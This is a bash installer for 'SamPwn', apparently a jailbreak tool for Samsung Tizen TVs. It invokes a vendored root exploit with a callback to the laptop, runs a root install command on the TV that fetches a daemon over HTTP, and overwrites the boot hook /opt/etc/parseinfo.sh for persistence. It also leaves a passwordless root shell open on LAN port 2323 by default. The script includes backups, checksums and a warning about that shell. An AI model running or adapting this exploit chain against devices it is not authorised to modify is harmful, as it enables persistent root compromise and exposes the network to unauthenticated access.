#!/usr/bin/env bash
# SamPwn installer.
#
# Installs the SamPwn widget and root daemon on a Samsung Tizen TV, enables
# boot persistence, and launches the dashboard.  Run this on a laptop that is
# on the same network as the TV.
#
# The TV's `sdb push` is unreliable, so files are served over HTTP from this
# laptop and fetched on the TV with curl.  Every file is SHA-256 verified on
# both sides before it is moved into place.
set -euo pipefail

ROOT=$(cd "$(dirname "$0")" && pwd)
TV_IP=${TV_IP:-}
HOST_IP=${HOST_IP:-}
SHELL_STATE=${SHELL_STATE:-on}
SHOW=1
PORT_ARG=8000
PYTHON=${PYTHON:-python3}
APP_ID=sampwnroot.dashboard
WGT=$ROOT/app/SamPwn.wgt
SERVE_PID=
STAGE=
SERVE_LOG=

usage() {
    cat <<'EOF'
Usage: ./install.sh --tv TV_IP [options]

  --tv IP            TV IPv4 address (required unless TV_IP is set)
  --host IP          laptop IPv4 reachable from the TV (auto-detected)
  --port N           preferred laptop HTTP port (default 8000)
  --shell on|off     leave the LAN root shell enabled or disabled (default on)
  --no-show          disable the automatic one-shot show
  -h, --help         show this help

Environment: TV_IP, HOST_IP, SHELL_STATE, PYTHON, TIZEN_STUDIO

Requirements on the laptop:
  * Python 3.12+ and openssl
  * Tizen Studio CLI (sdb and tizen) in PATH or TIZEN_STUDIO
  * curl, sha256sum

The TV must have Developer Mode enabled and allow the laptop in the sdb
connection prompt.  See docs/INSTALL.md for the full checklist.
EOF
}

info() { printf '[sampwn] %s\n' "$*"; }
warn() { printf '[sampwn] WARNING: %s\n' "$*" >&2; }
die()  { printf '[sampwn] ERROR: %s\n' "$*" >&2; exit 1; }

cleanup() {
    if [ -n "${SERVE_PID:-}" ]; then
        kill "$SERVE_PID" 2>/dev/null || true
        wait "$SERVE_PID" 2>/dev/null || true
    fi
    if [ -n "${STAGE:-}" ] && [ -d "$STAGE" ]; then
        rm -rf "$STAGE"
    fi
}
trap cleanup EXIT INT TERM

while [ $# -gt 0 ]; do
    case "$1" in
        --tv) [ $# -ge 2 ] || die "--tv needs an argument"; TV_IP=$2; shift 2 ;;
        --host) [ $# -ge 2 ] || die "--host needs an argument"; HOST_IP=$2; shift 2 ;;
        --port) [ $# -ge 2 ] || die "--port needs an argument"; PORT_ARG=$2; shift 2 ;;
        --shell) [ $# -ge 2 ] || die "--shell needs on or off"; SHELL_STATE=$2; shift 2 ;;
        --no-show) SHOW=0; shift ;;
        -h|--help) usage; exit 0 ;;
        *) die "unknown option: $1 (see --help)" ;;
    esac
done

case "${SHELL_STATE,,}" in
    on|1|true|yes) SHELL_STATE=on ;;
    off|0|false|no) SHELL_STATE=off ;;
    *) die "--shell must be on or off" ;;
esac

[ -n "$TV_IP" ] || die "TV address is required: use --tv IP (or set TV_IP)"
[[ "$TV_IP" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || die "invalid TV IPv4: $TV_IP"
[[ "$PORT_ARG" =~ ^[0-9]+$ ]] || die "invalid port: $PORT_ARG"
[ -f "$WGT" ] || die "missing widget: $WGT"
[ -f "$ROOT/dist/srv/SampwnSrv.dll" ] || die "missing daemon: $ROOT/dist/srv/SampwnSrv.dll"
[ -f "$ROOT/vendor/payloads/common31/SamsungTvArchiveRoot.dll" ] || \
    die "missing vendored exploit payload (see vendor/README.md)"

# ---------------------------------------------------------------------------
# Laptop prerequisites
# ---------------------------------------------------------------------------
command -v curl >/dev/null || die "curl is required"
command -v sha256sum >/dev/null || die "sha256sum is required"
command -v openssl >/dev/null || die "openssl is required"
[ -x "$PYTHON" ] || command -v "$PYTHON" >/dev/null || die "python3 not found"

"$PYTHON" - <<'PY' || die "Python 3.12 or newer is required"
import sys
if sys.version_info < (3, 12):
    sys.stderr.write("found Python %s\n" % sys.version.split()[0])
    raise SystemExit(1)
PY

if [ -z "$HOST_IP" ]; then
    HOST_IP=$(ip route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1); exit}}')
fi
if [ -z "$HOST_IP" ]; then
    HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
fi
[ -n "$HOST_IP" ] || die "could not auto-detect the laptop address; use --host IP"
[[ "$HOST_IP" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || die "invalid laptop IPv4: $HOST_IP"

# Tizen Studio CLI
for dir in ${TIZEN_STUDIO:+"$TIZEN_STUDIO"} "$HOME/tizen-studio" /opt/tizen-studio /usr/local/tizen-studio; do
    if [ -d "$dir/tools" ]; then
        PATH="$dir/tools/ide/bin:$dir/tools:$PATH"
        export TIZEN_STUDIO=$dir
        break
    fi
done
export PATH
command -v sdb >/dev/null || die "sdb not found; install Tizen Studio CLI or set TIZEN_STUDIO"
command -v tizen >/dev/null || die "tizen not found; install Tizen Studio CLI or set TIZEN_STUDIO"

info "TV $TV_IP, laptop $HOST_IP"
info "connecting sdb"
sdb connect "$TV_IP:26101" >/dev/null 2>&1 || true
if ! sdb devices 2>/dev/null | awk -v t="$TV_IP:26101" '$1==t && $2=="device"{f=1} END{exit f?0:1}'; then
    die "sdb does not see $TV_IP:26101. Enable Developer Mode, accept the prompt on the TV, then retry."
fi

info "installing the SamPwn widget"
if ! (cd "$ROOT/app" && tizen install -n SamPwn.wgt -s "$TV_IP:26101" -- .); then
    die "widget install failed (is Developer Mode still enabled?)"
fi

# ---------------------------------------------------------------------------
# Stage files and start the laptop HTTP server on an unused port
# ---------------------------------------------------------------------------
STAGE=$(mktemp -d "${TMPDIR:-/tmp}/sampwn-stage.XXXXXX")
cp "$ROOT/dist/srv/SampwnSrv.dll" "$ROOT/dist/srv/SampwnSrv.deps.json" \
   "$ROOT/dist/srv/SampwnSrv.runtimeconfig.json" "$ROOT/boothook/parseinfo.sh" "$STAGE/"

file_sha() { sha256sum "$1" | awk '{print $1}'; }
DLL_SHA=$(file_sha "$STAGE/SampwnSrv.dll")
DEPS_SHA=$(file_sha "$STAGE/SampwnSrv.deps.json")
RT_SHA=$(file_sha "$STAGE/SampwnSrv.runtimeconfig.json")
HOOK_SHA=$(file_sha "$STAGE/parseinfo.sh")

SERVE_LOG=$(mktemp "${TMPDIR:-/tmp}/sampwn-serve.XXXXXX")

start_server() {
    local wanted=$1
    if [ -n "${SERVE_PID:-}" ]; then
        kill "$SERVE_PID" 2>/dev/null || true
        wait "$SERVE_PID" 2>/dev/null || true
        SERVE_PID=
    fi
    : >"$SERVE_LOG"
    "$PYTHON" "$ROOT/tools/serve.py" --root "$STAGE" --bind 0.0.0.0 \
        --port "$wanted" --quiet >"$SERVE_LOG" 2>&1 &
    SERVE_PID=$!
    PORT=
    for _ in $(seq 1 60); do
        if grep -q 'SAMPWN_SERVE_READY' "$SERVE_LOG" 2>/dev/null; then
            PORT=$(awk '/SAMPWN_SERVE_READY/{print $3; exit}' "$SERVE_LOG")
            return 0
        fi
        kill -0 "$SERVE_PID" 2>/dev/null || return 1
        sleep 0.1
    done
    return 1
}

if ! start_server "$PORT_ARG"; then
    warn "port $PORT_ARG is unavailable; letting the OS choose a free port"
    start_server 0 || die "HTTP server failed to start (see $SERVE_LOG)"
fi
[ -n "$PORT" ] || die "HTTP server did not report a port (see $SERVE_LOG)"
curl -fsS "http://127.0.0.1:$PORT/SampwnSrv.dll" -o /dev/null || die "local HTTP self-check failed"
info "serving deploy files on $HOST_IP:$PORT"

# ---------------------------------------------------------------------------
# Remote install command.  This runs as root on the TV.
# ---------------------------------------------------------------------------
REMOTE_INSTALL=$(cat <<EOF
set +e
umask 022
D=/opt/etc/sampwn
B='http://$HOST_IP:$PORT'
mkdir -p "\$D" || { echo 'SAMPWN_INSTALL_FAIL mkdir'; exit 20; }

curl -fsS "\$B/SampwnSrv.dll" -o "\$D/SampwnSrv.dll.new" || { echo 'SAMPWN_INSTALL_FAIL download dll'; exit 21; }
[ "\$(sha256sum "\$D/SampwnSrv.dll.new" | awk '{print \$1}')" = '$DLL_SHA' ] || { echo 'SAMPWN_INSTALL_FAIL verify dll'; exit 22; }
curl -fsS "\$B/SampwnSrv.deps.json" -o "\$D/SampwnSrv.deps.json.new" || { echo 'SAMPWN_INSTALL_FAIL download deps'; exit 23; }
[ "\$(sha256sum "\$D/SampwnSrv.deps.json.new" | awk '{print \$1}')" = '$DEPS_SHA' ] || { echo 'SAMPWN_INSTALL_FAIL verify deps'; exit 24; }
curl -fsS "\$B/SampwnSrv.runtimeconfig.json" -o "\$D/SampwnSrv.runtimeconfig.json.new" || { echo 'SAMPWN_INSTALL_FAIL download runtimeconfig'; exit 25; }
[ "\$(sha256sum "\$D/SampwnSrv.runtimeconfig.json.new" | awk '{print \$1}')" = '$RT_SHA' ] || { echo 'SAMPWN_INSTALL_FAIL verify runtimeconfig'; exit 26; }
curl -fsS "\$B/parseinfo.sh" -o /opt/etc/parseinfo.sh.new || { echo 'SAMPWN_INSTALL_FAIL download hook'; exit 27; }
[ "\$(sha256sum /opt/etc/parseinfo.sh.new | awk '{print \$1}')" = '$HOOK_SHA' ] || { echo 'SAMPWN_INSTALL_FAIL verify hook'; exit 28; }

# Keep the first original hook as parseinfo.orig.sh.  Never overwrite an
# existing backup; that would destroy the only copy of the original file.
if [ -f /opt/etc/parseinfo.sh ] && [ ! -f /opt/etc/parseinfo.orig.sh ] && ! grep -q 'SamPwn boot hook' /opt/etc/parseinfo.sh; then
    cp -p /opt/etc/parseinfo.sh /opt/etc/parseinfo.orig.sh || { echo 'SAMPWN_INSTALL_FAIL backup hook'; exit 29; }
fi

chmod 755 /opt/etc/parseinfo.sh.new || { echo 'SAMPWN_INSTALL_FAIL chmod hook'; exit 30; }
mv -f /opt/etc/parseinfo.sh.new /opt/etc/parseinfo.sh || { echo 'SAMPWN_INSTALL_FAIL install hook'; exit 31; }
mv -f "\$D/SampwnSrv.dll.new" "\$D/SampwnSrv.dll" || { echo 'SAMPWN_INSTALL_FAIL install dll'; exit 32; }
mv -f "\$D/SampwnSrv.deps.json.new" "\$D/SampwnSrv.deps.json" || { echo 'SAMPWN_INSTALL_FAIL install deps'; exit 33; }
mv -f "\$D/SampwnSrv.runtimeconfig.json.new" "\$D/SampwnSrv.runtimeconfig.json" || { echo 'SAMPWN_INSTALL_FAIL install runtimeconfig'; exit 34; }
printf '$SHELL_STATE\n' > "\$D/shell.state" || { echo 'SAMPWN_INSTALL_FAIL write shell state'; exit 35; }
rm -f "\$D/disabled"

# Recreate the transient units and start them.  If an old daemon is already
# running, this is a no-op; a detached restart below loads the new binary.
/opt/etc/parseinfo.sh >/dev/null 2>&1
i=0
while [ \$i -lt 15 ]; do
    curl -fsS --max-time 3 http://127.0.0.1:2324/status >/dev/null 2>&1 && break
    sleep 1
    i=\$((i+1))
done
curl -fsS --max-time 3 http://127.0.0.1:2324/status >/dev/null 2>&1 || { echo 'SAMPWN_INSTALL_FAIL daemon not responding'; exit 36; }

if [ '$SHOW' = '1' ]; then
    rm -f "\$D/no-show"
    touch "\$D/show.pending"
else
    touch "\$D/no-show"
    rm -f "\$D/show.pending"
fi

# Restart after the reply is sent.  When this command came in through the live
# root shell, the restart kills that shell; when it came through the exploit
# it does not.  Either way the new binary is loaded a moment later.
( sleep 2; /bin/systemctl restart --no-block sampwn.service ) >/dev/null 2>&1 &
echo SAMPWN_INSTALL_OK
exit 0
EOF
)

root_shell_ok() {
    "$PYTHON" "$ROOT/tools/rootshell.py" --host "$TV_IP" --port 2323 --quiet \
        'id' >/dev/null 2>&1
}

info "deploying the daemon and boot hook"
set +e
if root_shell_ok; then
    info "reusing the live root shell"
    OUT=$("$PYTHON" "$ROOT/tools/rootshell.py" --host "$TV_IP" --port 2323 \
        "$REMOTE_INSTALL" 120 2>&1)
    RC=$?
else
    info "acquiring root (this normally takes 20-60 seconds)"
    OUT=$(cd "$ROOT/vendor/samsung_tv_root" && \
        PYTHONPATH=src "$PYTHON" -m samsung_tv_root archive-root root "$TV_IP" \
            --runtime 3.1 --sdb-timeout 30 --accept-timeout 60 \
            --command-timeout 120 --callback-host "$HOST_IP" \
            --payload-directory "$ROOT/vendor/payloads/common31" \
            --command "$REMOTE_INSTALL" 2>&1)
    RC=$?
fi
set -e

if ! printf '%s\n' "$OUT" | grep -q 'SAMPWN_INSTALL_OK'; then
    printf '%s\n' "$OUT" | tail -30 >&2
    die "remote install failed (exit $RC); see the output above and docs/TROUBLESHOOTING.md"
fi

# The restart is detached; give it time to come back.
sleep 5

if [ "$SHELL_STATE" = on ]; then
    STATUS=
    for _ in $(seq 1 15); do
        STATUS=$("$PYTHON" "$ROOT/tools/rootshell.py" --host "$TV_IP" --port 2323 \
            --quiet 'curl -fsS --max-time 3 http://127.0.0.1:2324/status' 2>/dev/null || true)
        [ -n "$STATUS" ] && break
        sleep 1
    done
    if [ -z "$STATUS" ]; then
        warn "daemon did not answer after restart; check docs/TROUBLESHOOTING.md"
    else
        info "status: $STATUS"
        case "$STATUS" in
            *'"hook":true'*) ;;
            *) warn "boot hook is not visible to the daemon" ;;
        esac
        case "$STATUS" in
            *'"widget":true'*) ;;
            *) warn "widget path is not visible to the daemon" ;;
        esac
    fi
else
    info "root shell left disabled (dashboard can turn it on)"
fi

info "launching SamPwn"
tizen run -p "$APP_ID" -s "$TV_IP:26101" >/dev/null 2>&1 || \
    warn "could not launch the dashboard; open the SamPwn app from the TV home screen"

cat <<EOF

SamPwn is installed.

  Dashboard:  SamPwn app on the TV
  Root shell: $TV_IP:2323 ($SHELL_STATE)
  Control:    127.0.0.1:2324 (TV localhost only)

WARNING: the root shell has no password. Turn it off when you are not using it.

The first launch after boot may play pwned.html.  Press Back to return to the
dashboard.  Turn the root shell off in the dashboard when you are not using it.
Uninstall with: ./uninstall.sh --tv $TV_IP
EOF
